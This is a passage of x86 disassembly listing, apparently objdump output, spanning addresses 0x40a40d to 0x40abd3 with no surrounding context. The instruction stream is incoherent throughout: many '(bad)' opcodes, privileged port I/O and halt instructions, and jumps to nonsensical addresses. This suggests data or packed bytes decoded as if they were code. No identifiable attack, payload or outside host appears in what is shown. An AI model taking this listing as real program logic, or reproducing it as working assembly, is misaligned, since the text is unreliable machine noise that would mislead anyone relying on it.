  40a40d:	fdiv   st(4),st
  40a40f:	or     esp,esp
  40a411:	add    al,0x1
  40a413:	hlt    
  40a414:	in     eax,0x7
  40a416:	jecxz  0x40a3da
  40a418:	loopne 0x40a3c8
  40a41a:	lock jecxz 0x40a40b
  40a41d:	out    0xd8,al
  40a41f:	xlat   BYTE PTR ds:[ebx]
  40a420:	(bad)  
  40a421:	call   0xfd3e97f2
  40a426:	lock lock shl esi,1
  40a42a:	add    al,0xf4
  40a42c:	cmc    
  40a42d:	(bad)
  40a430:	mov    BYTE PTR [eax],0xde
  40a433:	cld    
  40a434:	repz icebp 
  40a436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a437:	iret   
  40a438:	iret   
  40a439:	loope  0x40a40d
  40a43b:	(bad)  
  40a43c:	out    dx,eax
  40a43d:	(bad)  
  40a43e:	loopne 0x40a436
  40a440:	mov    al,0xd8
  40a442:	in     al,dx
  40a443:	iret   
  40a444:	shl    cl,cl
  40a446:	sar    BYTE PTR [esi-0x13023f2f],cl
  40a44c:	or     cl,BYTE PTR [ebx]
  40a44e:	(bad)  
  40a44f:	stc    
  40a450:	pop    es
  40a451:	(bad)  
  40a453:	sti    
  40a454:	clc    
  40a455:	add    eax,0xe2e6afd0
  40a45a:	bnd jmp 0x40a427
  40a45d:	jmp    0x40a44c
  40a45f:	hlt    
  40a460:	cli    
  40a461:	test   edi,0x3d5d6fb
  40a467:	fidivr WORD PTR [edi-0x3439f901]
  40a46d:	std    
  40a46e:	or     cl,al
  40a470:	rol    al,0xeb
  40a473:	in     eax,dx
  40a474:	leave  
  40a475:	out    dx,al
  40a476:	mov    edi,0xdca8f1b1
  40a47b:	out    0xda,eax
  40a47d:	out    dx,eax
  40a47e:	fdivr  st,st(7)
  40a480:	cmc    
  40a481:	mov    ah,0xdc
  40a483:	mov    dh,0xfc
  40a485:	(bad)  
  40a487:	loopne 0x40a47a
  40a489:	(bad)  
  40a48a:	lock in al,0xe5
  40a48d:	std    
  40a48e:	jmp    0x40a467
  40a490:	add    ch,dl
  40a492:	push   esp
  40a494:	vpavgb ymm1,ymm6,ymm7
  40a498:	out    0xc8,eax
  40a49a:	test   bl,0xc3
  40a49d:	call   0xde259266
  40a4a2:	mov    esi,0xfdfbdacc
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	fadd   st(0),st
  40a4aa:	out    0xd4,al
  40a4ac:	ror    DWORD PTR [ecx],1
  40a4ae:	jmp    0x40a486
  40a4b0:	mov    ebp,0xac60dcf
  40a4b5:	fadd   st(4),st
  40a4b7:	(bad)  
  40a4b9:	out    0xea,al
  40a4bb:	scas   al,BYTE PTR es:[edi]
  40a4bc:	enter  0xcabb,0xc6
  40a4c0:	(bad)  
  40a4c1:	in     eax,dx
  40a4c2:	jmp    0xea3188c3
  40a4c7:	div    ah
  40a4c9:	lock loope 0x40a4ca
  40a4cc:	shr    ebx,cl
  40a4ce:	shl    ebp,0x5
  40a4d1:	hlt    
  40a4d2:	retf   
  40a4d3:	sti    
  40a4d4:	repnz out 0xce,al
  40a4d7:	shr    edx,0xcb
  40a4da:	repz mov dl,0xd5
  40a4dd:	mov    cl,0xb9
  40a4df:	leave  
  40a4e0:	hlt    
  40a4e1:	icebp  
  40a4e2:	int3   
  40a4e3:	ror    ah,1
  40a4e5:	mov    esp,0xc7d4d4f4
  40a4ea:	mov    esp,0xf9fec7c3
  40a4ef:	fisttp WORD PTR [ebx]
  40a4f1:	cmc    
  40a4f2:	fimul  WORD PTR ds:0xd8d8ec00
  40a4f8:	out    dx,al
  40a4f9:	(bad)  
  40a4fa:	test   edi,0xf9cdeed3
  40a500:	in     eax,0xb4
  40a502:	(bad)  
  40a505:	sar    bl,1
  40a507:	sti    
  40a508:	mov    edi,0xaf8c0c6
  40a50d:	loop   0x40a512
  40a50f:	mov    esi,0xe3c4bcda
  40a514:	add    eax,0xeecbcaef
  40a519:	retf   0xceee
  40a51c:	int3   
  40a51d:	xbegin 0xeb2a9c08
  40a523:	fucomi st,st(4)
  40a525:	shl    ebx,1
  40a527:	mov    edx,0xbefcfefc
  40a52c:	icebp  
  40a52d:	loope  0x40a4ef
  40a52f:	lock fmul DWORD PTR [ebx]
  40a532:	in     al,dx
  40a533:	(bad)  
  40a535:	call   0xd0f15523
  40a53a:	out    0xe6,eax
  40a53c:	hlt    
  40a53d:	test   al,0xcd
  40a53f:	into   
  40a540:	xlat   BYTE PTR ds:[ebx]
  40a541:	repz (bad) 
  40a543:	cmc    
  40a544:	fadd   DWORD PTR [edx]
  40a546:	(bad)  
  40a547:	call   0xd419644c
  40a54c:	fst    st(2)
  40a54e:	add    BYTE PTR [eax],al
  40a550:	push   cs
  40a551:	leave  
  40a552:	or     esi,edi
  40a554:	cli    
  40a555:	loope  0x40a535
  40a557:	loop   0x40a52b
  40a559:	out    dx,eax
  40a55a:	mov    bh,0xcd
  40a55c:	retf   
  40a55d:	mov    ch,0xe6
  40a55f:	repz ftst 
  40a562:	mov    ebx,0xddefd6cb
  40a567:	rcl    al,0xf7
  40a56a:	aam    0xf3
  40a56c:	fmul   DWORD PTR [edx]
  40a56e:	add    ch,cl
  40a570:	jecxz  0x40a537
  40a572:	std    
  40a573:	(bad)
  40a576:	stos   BYTE PTR es:[edi],al
  40a577:	(bad)  
  40a578:	int    0xbc
  40a57a:	int    0xaa
  40a57c:	loopne 0x40a530
  40a57e:	mov    ebx,0xc9e9c8ee
  40a583:	cld    
  40a584:	cli    
  40a585:	mul    bl
  40a587:	ret    0xdab5
  40a58a:	rcr    ah,1
  40a58c:	fisttp DWORD PTR [ecx]
  40a58e:	mov    edi,0x7ce03e9
  40a593:	retf   0xea01
  40a596:	mov    bl,0xbd
  40a598:	in     eax,dx
  40a599:	enter  0xacb1,0xdb
  40a59d:	mov    dh,0xf8
  40a59f:	fdiv   st,st(1)
  40a5a1:	rcr    eax,1
  40a5a3:	mov    dh,0xf3
  40a5a5:	in     eax,dx
  40a5a6:	add    DWORD PTR [edx],eax
  40a5a8:	mov    edi,0xf3f8dacc
  40a5ad:	jecxz  0x40a599
  40a5af:	fstp   TBYTE PTR [ebp-0x351f013b]
  40a5b5:	or     al,al
  40a5b7:	ror    ebx,0xad
  40a5ba:	ret    0xccf4
  40a5bd:	shl    BYTE PTR [esi-0xc4a164b],cl
  40a5c3:	imul   al
  40a5c5:	aad    0xe1
  40a5c7:	loopne 0x40a5c2
  40a5c9:	fucomp st(5)
  40a5cb:	push   es
  40a5cc:	inc    ebp
  40a5ce:	retf   0xdaea
  40a5d1:	jmp    0x62c7fa4
  40a5d6:	jecxz  0x40a5a7
  40a5d8:	int3   
  40a5d9:	mov    dh,0xc2
  40a5db:	lds    esi,FWORD PTR [ebp-0x1a2f0646]
  40a5e1:	ror    bl,1
  40a5e3:	mov    ch,0xbb
  40a5e5:	shl    ah,1
  40a5e7:	sar    BYTE PTR [edi+edx*8-0x232f0822],cl
  40a5ee:	ret    
  40a5ef:	fdiv   st(2),st
  40a5f1:	or     bl,bh
  40a5f3:	push   cs
  40a5f4:	stc    
  40a5f5:	fucom  st(5)
  40a5f7:	out    0xae,eax
  40a5f9:	test   al,0xb5
  40a5fb:	fmul   st(0),st
  40a5fd:	sti    
  40a5fe:	retf   0xd9d2
  40a601:	repnz retf 0x3dc
  40a605:	aam    0xfc
  40a607:	loopne 0x40a5f9
  40a609:	std    
  40a60a:	(bad)  
  40a60b:	(bad)  
  40a60c:	cld    
  40a60d:	cmc    
  40a60e:	stc    
  40a60f:	inc    DWORD PTR [ecx]
  40a611:	loope  0x40a5f1
  40a613:	fsub   st(1),st
  40a615:	or     ecx,ebp
  40a617:	jecxz  0x40a5fa
  40a619:	ret    
  40a61a:	scas   eax,DWORD PTR es:[edi]
  40a61b:	in     al,0xea
  40a61d:	iret   
  40a61e:	aad    0xc0
  40a620:	in     eax,dx
  40a621:	rcl    eax,cl
  40a623:	mov    ebx,0xd6bbe2f2
  40a628:	fnstcw WORD PTR [ebp+ebp*8-0x11f3924]
  40a62f:	fadd   st,st(6)
  40a631:	or     eax,esi
  40a633:	fsub   st,st(7)
  40a635:	(bad)  
  40a636:	int    0xdd
  40a638:	out    0xa4,al
  40a63a:	mov    cl,0xc5
  40a63c:	out    0xc0,al
  40a63e:	out    dx,eax
  40a63f:	repnz sti 
  40a641:	mov    esi,0xedf0f6b4
  40a646:	mov    ecx,0xd3b8cee3
  40a64b:	int3   
  40a64c:	(bad)  
  40a64d:	or     dh,ch
  40a64f:	cmc    
  40a650:	cld    
  40a651:	out    0x3,al
  40a653:	or     edi,edi
  40a655:	or     al,ah
  40a657:	test   al,0xae
  40a659:	int    0xcc
  40a65b:	mov    esp,0xd6c8e7ed
  40a660:	(bad)  
  40a661:	rcl    ebx,cl
  40a663:	leave  
  40a664:	icebp  
  40a665:	leave  
  40a666:	sar    dl,cl
  40a668:	aad    0xbd
  40a66a:	mov    ebp,0xc60704e4
  40a66f:	out    dx,eax
  40a670:	add    al,0xe8
  40a672:	loope  0x40a63a
  40a674:	jmp    0xf32a5666
  40a679:	lock hlt 
  40a67b:	into   
  40a67c:	in     eax,0xb1
  40a67e:	aam    0xce
  40a680:	mov    al,0xf6
  40a682:	imul   dl
  40a684:	idiv   DWORD PTR [esi-0x333f4213]
  40a68a:	loop   0x40a65c
  40a68c:	(bad)  
  40a68d:	std    
  40a68e:	cmc    
  40a68f:	(bad)  
  40a691:	out    0xd8,eax
  40a693:	aam    0xe2
  40a695:	out    dx,al
  40a696:	fmul   st(3),st
  40a698:	in     al,dx
  40a699:	retf   
  40a69a:	out    dx,eax
  40a69b:	neg    bl
  40a69d:	mov    dl,0xe8
  40a69f:	sti    
  40a6a0:	mov    eax,0xecdbb7d2
  40a6a5:	int    0xdb
  40a6a7:	jecxz  0x40a680
  40a6a9:	sar    bh,cl
  40a6ab:	std    
  40a6ac:	test   edx,0xf502c1c0
  40a6b2:	add    eax,0xd90dcbcd
  40a6b7:	loope  0x40a669
  40a6b9:	fucomp st(4)
  40a6bb:	test   esi,0xdeb0d2fa
  40a6c1:	(bad)  
  40a6c2:	in     al,0xe9
  40a6c4:	int    0xd9
  40a6c6:	add    DWORD PTR [edi],eax
  40a6c8:	repz (bad) 
  40a6cb:	lock jmp 0xed01:0xddf40bdd
  40a6d3:	retf   0xdddf
  40a6d6:	mov    esp,0xefe3d6e5
  40a6db:	ret    
  40a6dc:	repnz fucomi st,st(0)
  40a6df:	fmul   st,st(0)
  40a6e1:	fcomi  st,st(5)
  40a6e3:	rcl    esp,cl
  40a6e5:	iret   
  40a6e6:	repz lock out 0xed,al
  40a6ea:	cmc    
  40a6eb:	clc    
  40a6ec:	repz add al,0xeb
  40a6ef:	or     eax,DWORD PTR [ebx]
  40a6f1:	hlt    
  40a6f2:	or     DWORD PTR [eax],eax
  40a6f4:	(bad)  
  40a6f6:	jmp    0xd1289ee0
  40a6fb:	mov    ah,0xac
  40a6fd:	(bad)  
  40a6fe:	clc    
  40a6ff:	int    0xf8
  40a701:	(bad)  
  40a703:	rcl    esp,1
  40a705:	rcl    bh,1
  40a707:	cld    
  40a708:	shr    ebp,1
  40a70a:	mov    ebp,0xe4d5f9fd
  40a70f:	cld    
  40a710:	sti    
  40a711:	out    0xc4,eax
  40a713:	or     al,0xeb
  40a715:	adc    dh,BYTE PTR [edx-0x51311053]
  40a71b:	scas   al,BYTE PTR es:[edi]
  40a71c:	iret   
  40a71d:	icebp  
  40a71e:	retf   0xe7f1
  40a721:	cmc    
  40a722:	(bad)  
  40a723:	int    0xe8
  40a725:	mov    ah,0xfc
  40a727:	int    0xe6
  40a729:	in     al,dx
  40a72a:	loope  0x40a727
  40a72c:	retf   
  40a72d:	(bad)
  40a730:	out    0xf9,eax
  40a732:	loope  0x40a6f8
  40a734:	or     ebx,ecx
  40a736:	mov    cl,0xb0
  40a738:	shl    esp,0xb2
  40a73b:	mov    cl,0xc4
  40a73d:	stc    
  40a73e:	(bad)  
  40a73f:	in     al,dx
  40a740:	mov    edx,0xceeddbd6
  40a745:	int3   
  40a746:	repz jecxz 0x40a727
  40a749:	aad    0xec
  40a74b:	in     al,0x2
  40a74d:	pop    es
  40a74e:	hlt    
  40a74f:	retf   
  40a750:	fadd   DWORD PTR ds:0xe109e1cf
  40a756:	mov    dl,0xc3
  40a758:	mov    ebp,0xc2e7b2cc
  40a75d:	mov    bh,0xc0
  40a75f:	aad    0xf6
  40a761:	(bad)  
  40a762:	sar    edi,1
  40a764:	mov    edx,0xc1baedd0
  40a769:	loope  0x40a73d
  40a76b:	ret    
  40a76c:	mov    ecx,0xd50be7de
  40a771:	add    dl,ah
  40a773:	add    esi,ebx
  40a775:	or     BYTE PTR [ebp-0x142d141c],bh
  40a77b:	mov    dh,0xda
  40a77d:	loop   0x40a734
  40a77f:	(bad)  
  40a780:	sar    eax,cl
  40a782:	call   0x3327573
  40a787:	mov    edi,0x6e4daf4
  40a78c:	(bad)  
  40a78d:	rcr    bh,cl
  40a78f:	push   es
  40a790:	por    mm4,mm1
  40a793:	dec    BYTE PTR [eax]
  40a795:	loope  0x40a77d
  40a797:	lods   eax,DWORD PTR ds:[esi]
  40a798:	ret    0xd5b6
  40a79b:	xlat   BYTE PTR ds:[ebx]
  40a79c:	ret    0xfaea
  40a79f:	jmp    FWORD PTR [ebp-0x17153625]
  40a7a5:	fdiv   st(0),st
  40a7a7:	lock iret 
  40a7a9:	(bad)  
  40a7aa:	add    al,0xbc
  40a7ac:	aad    0x0
  40a7ae:	div    ch
  40a7b0:	enter  0xe5c8,0xc8
  40a7b4:	push   cs
  40a7b5:	ffree  st(0)
  40a7b7:	repnz out dx,al
  40a7b9:	jmp    0xd3b5:0xedc9cbd2
  40a7c0:	jmp    0xcc0b7f90
  40a7c5:	clc    
  40a7c6:	aad    0x7
  40a7c8:	loop   0x40a7c7
  40a7ca:	(bad)  
  40a7cc:	add    esp,ecx
  40a7ce:	fcomip st,st(5)
  40a7d0:	(bad)  [edx]
  40a7d2:	push   es
  40a7d3:	jmp    0xb8e7afb8
  40a7d8:	shr    al,cl
  40a7da:	leave  
  40a7db:	scas   al,BYTE PTR es:[edi]
  40a7dc:	fcmovne st,st(0)
  40a7de:	aad    0xb4
  40a7e0:	cli    
  40a7e1:	retf   
  40a7e2:	mov    ebx,0xfdbef3f7
  40a7e7:	rcl    bh,0xbc
  40a7ea:	push   es
  40a7eb:	(bad)  
  40a7ec:	cli    
  40a7ed:	icebp  
  40a7ee:	ret    
  40a7ef:	xlat   BYTE PTR ds:[ebx]
  40a7f0:	hlt    
  40a7f1:	or     DWORD PTR [eax],ecx
  40a7f3:	jmp    0xbcfaa1eb
  40a7f8:	rol    edi,1
  40a7fa:	scas   al,BYTE PTR es:[edi]
  40a7fb:	loopne 0x40a7cb
  40a7fd:	mov    bl,0xf6
  40a7ff:	jmp    0xdcd8:0xfebde4c6
  40a806:	ret    
  40a807:	aad    0xd1
  40a809:	fchs   
  40a80b:	fstp   st(5)
  40a80d:	ret    0xcbe6
  40a810:	mov    ebp,0x12ebcf04
  40a815:	(bad)  
  40a817:	jecxz  0x40a809
  40a819:	(bad)  
  40a81b:	not    bl
  40a81d:	sti    
  40a81e:	mov    ah,0xff
  40a820:	in     eax,0xeb
  40a822:	mov    ch,0xf1
  40a824:	add    edi,eax
  40a826:	jecxz  0x40a803
  40a828:	aam    0xf4
  40a82a:	sti    
  40a82b:	(bad)  
  40a82c:	shl    esp,1
  40a82e:	(bad)  
  40a82f:	or     esp,edi
  40a831:	add    al,0xff
  40a833:	in     eax,0x13
  40a835:	add    eax,0xe8f0dca8
  40a83a:	iret   
  40a83b:	jmp    0xb0b7:0xb0cfc2e2
  40a842:	stc    
  40a843:	enter  0xe2f8,0xd0
  40a847:	add    esi,ebx
  40a849:	mov    ch,0x4
  40a84c:	mov    ecx,0xe3ef0404
  40a851:	retf   
  40a852:	fiadd  WORD PTR [edx]
  40a854:	or     ch,ah
  40a856:	test   al,0xcf
  40a858:	jmp    0x40a82d
  40a85a:	loop   0x40a80a
  40a85c:	in     eax,0xd9
  40a85e:	mov    ecx,0xe9d8f3e6
  40a863:	aam    0xf5
  40a865:	(bad)  
  40a867:	ret    0xeed9
  40a86a:	pop    es
  40a86b:	in     al,0xf1
  40a86d:	or     DWORD PTR [esi],eax
  40a86f:	les    ecx,FWORD PTR [esi]
  40a871:	call   0xcd448781
  40a876:	shl    edi,1
  40a878:	icebp  
  40a879:	repnz les esi,FWORD PTR [eax-0x37450532]
  40a880:	fyl2x  
  40a882:	repnz int 0xe9
  40a885:	int    0xd7
  40a887:	fcomip st,st(0)
  40a889:	add    dl,dh
  40a88b:	fninit 
  40a88d:	aam    0x8
  40a88f:	out    0xa,al
  40a891:	paddusw mm6,mm4
  40a894:	(bad)  
  40a896:	lods   al,BYTE PTR ds:[esi]
  40a897:	int    0xc5
  40a899:	test   al,0xc8
  40a89b:	scas   al,BYTE PTR es:[edi]
  40a89c:	jecxz  0x40a88c
  40a89e:	int    0xd7
  40a8a0:	(bad)  
  40a8a1:	mov    al,0xd8
  40a8a3:	aam    0xce
  40a8a5:	repz cli 
  40a8a7:	call   0xe63b6b89
  40a8ac:	add    edx,ebp
  40a8ae:	jmp    0xe93cb288
  40a8b3:	hlt    
  40a8b4:	out    0xe5,eax
  40a8b6:	scas   eax,DWORD PTR es:[edi]
  40a8b7:	bnd jmp 0xad2c8e61
  40a8bd:	imul   edx
  40a8bf:	sti    
  40a8c0:	(bad)  
  40a8c1:	iret   
  40a8c2:	repz std 
  40a8c4:	fdivp  st(2),st
  40a8c6:	aad    0xfe
  40a8c8:	mov    ecx,0xdbdb01f0
  40a8cd:	rol    DWORD PTR [ebx],1
  40a8cf:	ffree  st(5)
  40a8d1:	hlt    
  40a8d2:	add    esp,eax
  40a8d4:	fucomp st(1)
  40a8d6:	int    0xaa
  40a8d8:	repnz mov esp,0xcbc8eed7
  40a8de:	repz mov eax,0xf1c5c6c8
  40a8e4:	retf   
  40a8e5:	loop   0x40a8e2
  40a8e7:	xlat   BYTE PTR ds:[ebx]
  40a8e8:	aad    0xd3
  40a8ea:	out    0xec,eax
  40a8ec:	fadd   st(5),st
  40a8ee:	add    dl,al
  40a8f0:	(bad)  
  40a8f1:	fcomi  st,st(4)
  40a8f3:	fmul   st(4),st
  40a8f5:	out    0xab,al
  40a8f7:	retf   
  40a8f8:	test   esp,0xf4b1d6b1
  40a8fe:	jmp    0xd9106efc
  40a903:	mov    dh,0xbc
  40a905:	lock sar dl,1
  40a908:	fild   WORD PTR [edi]
  40a90a:	(bad)  
  40a90b:	(bad)  
  40a90c:	clc    
  40a90d:	rol    dl,cl
  40a90f:	or     dl,bh
  40a911:	inc    BYTE PTR [eax]
  40a913:	add    ecx,ecx
  40a915:	add    al,0xc6
  40a917:	stos   BYTE PTR es:[edi],al
  40a918:	icebp  
  40a919:	cmc    
  40a91a:	leave  
  40a91b:	shr    bl,0xdb
  40a91e:	hlt    
  40a91f:	jmp    0xb0e3:0xefccb5c9
  40a926:	enter  0xd8,0xd3
  40a92a:	cli    
  40a92b:	inc    ah
  40a92d:	jmp    0xb1c721a
  40a932:	ret    
  40a933:	cld    
  40a934:	jmp    0x40a93c
  40a936:	repnz repnz fidiv WORD PTR [ecx-0x4d351112]
  40a93e:	clc    
  40a93f:	mov    dh,0xd0
  40a941:	in     eax,0xec
  40a943:	mov    edi,0xece1daef
  40a948:	fstp   st(1)
  40a94a:	int    0x7
  40a94c:	(bad)  
  40a94d:	(bad)  
  40a94e:	or     esp,edx
  40a950:	std    
  40a951:	mov    esi,0xc7e3eb01
  40a957:	(bad)  
  40a958:	lods   al,BYTE PTR ds:[esi]
  40a959:	ror    ah,0xf5
  40a95c:	mov    ebx,0xbbd5e7cc
  40a961:	out    dx,eax
  40a962:	mov    ah,0xcd
  40a964:	in     eax,dx
  40a965:	fnstcw WORD PTR [ebp-0x1d082114]
  40a96b:	out    0xd1,eax
  40a96d:	or     bl,dl
  40a96f:	les    eax,FWORD PTR [edx]
  40a971:	in     al,0x8
  40a973:	iret   
  40a974:	retf   0xeaf9
  40a977:	loope  0x40a925
  40a979:	leave  
  40a97a:	scas   al,BYTE PTR es:[edi]
  40a97b:	int3   
  40a97c:	in     al,0xcd
  40a97e:	enter  0xebb9,0xfb
  40a982:	out    dx,eax
  40a983:	cli    
  40a984:	stc    
  40a985:	leave  
  40a986:	in     al,dx
  40a987:	std    
  40a988:	ffree  st(0)
  40a98a:	imul   esp
  40a98c:	push   es
  40a98d:	out    0xf0,al
  40a98f:	std    
  40a990:	out    0xe,eax
  40a992:	or     cl,cl
  40a994:	into   
  40a995:	in     eax,0xc5
  40a997:	ffreep st(0)
  40a999:	aad    0xca
  40a99b:	iret   
  40a99c:	jecxz  0x40a990
  40a99e:	retf   
  40a99f:	out    dx,eax
  40a9a0:	mov    bh,0xf6
  40a9a2:	jmp    0xe037a67e
  40a9a7:	in     al,dx
  40a9a8:	mov    esi,0xfec4fce2
  40a9ad:	shl    dl,1
  40a9af:	loopne 0x40a9ba
  40a9b1:	sti    
  40a9b2:	psllq  mm2,QWORD PTR [edx]
  40a9b5:	out    0xd2,eax
  40a9b7:	shr    dh,1
  40a9b9:	loopne 0x40a98e
  40a9bb:	in     eax,0xea
  40a9bd:	retf   0xb2e9
  40a9c0:	sti    
  40a9c1:	mov    ebx,0xdaebbdf8
  40a9c6:	in     al,dx
  40a9c7:	sar    BYTE PTR [ebp+0x6da0703],cl
  40a9cd:	(bad)  
  40a9ce:	fmul   QWORD PTR [eax]
  40a9d0:	out    dx,al
  40a9d1:	les    eax,FWORD PTR ds:0xbceb0fda
  40a9d7:	ror    bh,cl
  40a9d9:	lods   eax,DWORD PTR ds:[esi]
  40a9da:	hlt    
  40a9db:	ret    0xc5fb
  40a9de:	shl    eax,0xfa
  40a9e1:	sti    
  40a9e2:	retf   
  40a9e3:	jmp    0x40a9b7
  40a9e5:	bnd jmp 0xf73babc4
  40a9eb:	aad    0xc2
  40a9ed:	(bad)  
  40a9ee:	sti    
  40a9ef:	(bad)
  40a9f2:	fcomi  st,st(4)
  40a9f4:	retf   0xd8f3
  40a9f7:	scas   eax,DWORD PTR es:[edi]
  40a9f8:	mov    cl,0xdc
  40a9fa:	out    dx,al
  40a9fb:	mov    al,0xeb
  40a9fd:	aad    0xd1
  40a9ff:	cmc    
  40aa00:	rcr    ecx,cl
  40aa02:	int3   
  40aa03:	mov    ah,0xcf
  40aa05:	fadd   DWORD PTR [ecx]
  40aa07:	(bad)  
  40aa08:	out    dx,al
  40aa09:	not    ah
  40aa0b:	(bad)  
  40aa0c:	fcmovbe st,st(4)
  40aa0e:	shl    ch,1
  40aa10:	in     eax,0xd8
  40aa12:	fild   DWORD PTR [esp+edi*8]
  40aa15:	add    al,0xbc
  40aa17:	test   al,0xd2
  40aa19:	(bad)  
  40aa1b:	out    dx,eax
  40aa1c:	(bad)  
  40aa1e:	stc    
  40aa1f:	out    dx,eax
  40aa20:	(bad)  
  40aa21:	out    0xb4,al
  40aa23:	fcomip st,st(1)
  40aa25:	xlat   BYTE PTR ds:[ebx]
  40aa26:	cli    
  40aa27:	mov    edi,0xdaf3b8fe
  40aa2c:	xlat   BYTE PTR ds:[ebx]
  40aa2d:	loope  0x40aa25
  40aa2f:	ret    0xdc0b
  40aa32:	leave  
  40aa33:	fiadd  DWORD PTR [ebx]
  40aa35:	fadd   st,st(0)
  40aa37:	mov    cl,0xbf
  40aa39:	mov    al,0xf0
  40aa3b:	test   ebp,0xf4cfcad2
  40aa41:	mov    al,0xba
  40aa43:	shr    ch,cl
  40aa45:	into   
  40aa46:	xlat   BYTE PTR ds:[ebx]
  40aa47:	sti    
  40aa48:	hlt    
  40aa49:	lock int3 
  40aa4b:	pop    es
  40aa4c:	or     ecx,DWORD PTR [ecx]
  40aa4e:	fcomip st,st(5)
  40aa50:	fild   WORD PTR [ecx]
  40aa52:	hlt    
  40aa53:	out    0x6,eax
  40aa55:	jecxz  0x40aa02
  40aa57:	lock lock jecxz 0x40aa29
  40aa5b:	out    0xe4,al
  40aa5d:	repz shr ebx,0xb7
  40aa61:	aam    0xea
  40aa63:	xlat   BYTE PTR ds:[ebx]
  40aa64:	xlat   BYTE PTR ds:[ebx]
  40aa65:	stc    
  40aa66:	int3   
  40aa67:	mov    esp,0xc203c7d3
  40aa6c:	retf   
  40aa6d:	add    ebp,edx
  40aa6f:	aam    0xfd
  40aa71:	out    dx,eax
  40aa72:	(bad)  
  40aa73:	dec    DWORD PTR [edx]
  40aa75:	in     eax,0xe9
  40aa77:	mov    esi,0xb4e6a4de
  40aa7c:	shl    DWORD PTR [ebp-0x451b2f2f],0xe9
  40aa83:	mov    edx,0xce02bcf7
  40aa88:	into   
  40aa89:	loopne 0x40aa6d
  40aa8b:	ret    
  40aa8c:	(bad)  
  40aa8e:	clc    
  40aa8f:	sti    
  40aa90:	add    al,al
  40aa92:	cli    
  40aa93:	in     eax,dx
  40aa94:	enter  0xa9fe,0xf0
  40aa98:	(bad)  
  40aa9a:	mov    cl,0xdc
  40aa9c:	in     eax,0xe7
  40aa9e:	icebp  
  40aa9f:	icebp  
  40aaa0:	jmp    0xf6f3:0xf5ddefd0
  40aaa7:	cld    
  40aaa8:	cmc    
  40aaa9:	mov    edi,0x7c0d6f1
  40aaae:	xlat   BYTE PTR ds:[ebx]
  40aaaf:	lock fcmovnbe st,st(4)
  40aab2:	jmp    0xbdde:0xc112cdc4
  40aab9:	mov    esp,0xebefc4bc
  40aabe:	stc    
  40aabf:	fcom   st(0)
  40aac1:	mov    dh,0xcc
  40aac3:	jmp    0x40aab9
  40aac5:	fcmovb st,st(1)
  40aac7:	pop    es
  40aac8:	(bad)  
  40aac9:	in     eax,dx
  40aaca:	fsub   st,st(1)
  40aacc:	lds    ecx,FWORD PTR [edx]
  40aace:	add    eax,ebp
  40aad0:	out    dx,al
  40aad1:	(bad)  
  40aad2:	jecxz  0x40aa99
  40aad4:	loop   0x40aad5
  40aad6:	lock out dx,eax
  40aad8:	in     eax,dx
  40aad9:	mov    al,0xc3
  40aadb:	leave  
  40aadc:	out    0xd4,eax
  40aade:	rcl    eax,1
  40aae0:	xlat   BYTE PTR ds:[ebx]
  40aae1:	(bad)  
  40aae2:	clc    
  40aae3:	in     al,0xfd
  40aae5:	fdivr  st(1),st
  40aae7:	xlat   BYTE PTR ds:[ebx]
  40aae8:	mov    ebp,0xfedcf3e5
  40aaed:	aad    0xf7
  40aaef:	paddd  mm3,mm3
  40aaf2:	jecxz  0x40aadf
  40aaf4:	jmp    0xc0b1:0xeed1c0dd
  40aafb:	out    0xb3,al
  40aafd:	in     eax,0xf5
  40aaff:	in     eax,0xcd
  40ab01:	int    0xd3
  40ab03:	out    dx,al
  40ab04:	cli    
  40ab05:	leave  
  40ab06:	repnz fld st(3)
  40ab09:	hlt    
  40ab0a:	idiv   bl
  40ab0c:	ret    0xf8e0
  40ab0f:	add    ecx,DWORD PTR [esi]
  40ab11:	fcmove st,st(1)
  40ab13:	fscale 
  40ab15:	add    eax,esp
  40ab17:	shl    ch,0xcc
  40ab1a:	not    eax
  40ab1c:	mov    bh,0xf4
  40ab1e:	lock loopne 0x40aadc
  40ab21:	mov    eax,0xc8beccf7
  40ab26:	aad    0xef
  40ab28:	(bad)  
  40ab2a:	cli    
  40ab2b:	cld    
  40ab2c:	jmp    0x7dd:0xe3d4f5c4
  40ab33:	fadd   st,st(4)
  40ab35:	fucom  st(3)
  40ab37:	out    0xdf,al
  40ab39:	mov    bh,0xd3
  40ab3b:	fsubr  QWORD PTR [esi+esi*4-0x4817390e]
  40ab42:	mov    ah,0xd2
  40ab44:	retf   0xd8dc
  40ab47:	hlt    
  40ab48:	faddp  st(6),st
  40ab4a:	cld    
  40ab4b:	fsubr  st(1),st
  40ab4d:	lock or edi,esi
  40ab50:	leave  
  40ab51:	loop   0x40ab48
  40ab53:	retf   0xc4dd
  40ab56:	int    0xf2
  40ab58:	mov    al,0xd1
  40ab5a:	enter  0xcdc6,0xf9
  40ab5e:	ror    esp,1
  40ab60:	ror    dl,cl
  40ab62:	in     al,0xbc
  40ab64:	add    ch,dl
  40ab66:	jmp    0xc7419c6d
  40ab6b:	add    al,0xc6
  40ab6d:	(bad)  
  40ab6e:	shr    dl,1
  40ab70:	jmp    0x40ab4b
  40ab72:	out    dx,al
  40ab73:	(bad)  
  40ab76:	mov    cl,0xaf
  40ab78:	out    dx,eax
  40ab79:	rep lods al,BYTE PTR ds:[esi]
  40ab7b:	shl    al,0xc9
  40ab7e:	retf   
  40ab7f:	retf   
  40ab80:	mov    ch,0xe9
  40ab82:	jmp    0xda329c77
  40ab87:	sti    
  40ab88:	repnz add al,BYTE PTR [edi]
  40ab8b:	loope  0x40ab87
  40ab8d:	fdivr  st,st(4)
  40ab8f:	jecxz  0x40ab99
  40ab91:	jmp    0xd7e2:0x13ffdcea
  40ab98:	mov    edi,0xc8b3bce7
  40ab9d:	enter  0xb0ca,0xc4
  40aba1:	fstp   TBYTE PTR [eax-0x2b011546]
  40aba7:	cli    
  40aba8:	fnstsw WORD PTR [eax-0x3f2a080b]
  40abae:	fisttp DWORD PTR [ecx]
  40abb0:	(bad)  
  40abb2:	add    esp,esi
  40abb4:	repnz adc ebp,edx
  40abb7:	mov    eax,0xc1edbcca
  40abbc:	enter  0xcdc4,0xc4
  40abc0:	(bad)  
  40abc2:	sar    esp,cl
  40abc4:	repz clc 
  40abc6:	jecxz  0x40ab85
  40abc8:	not    bl
  40abca:	stc    
  40abcb:	in     eax,0xf6
  40abcd:	in     al,0x9
  40abcf:	add    al,0xf6
  40abd1:	jmp    0x40aba8
  40abd3:	fisttp WORD PTR ds:0xa9ecbf02
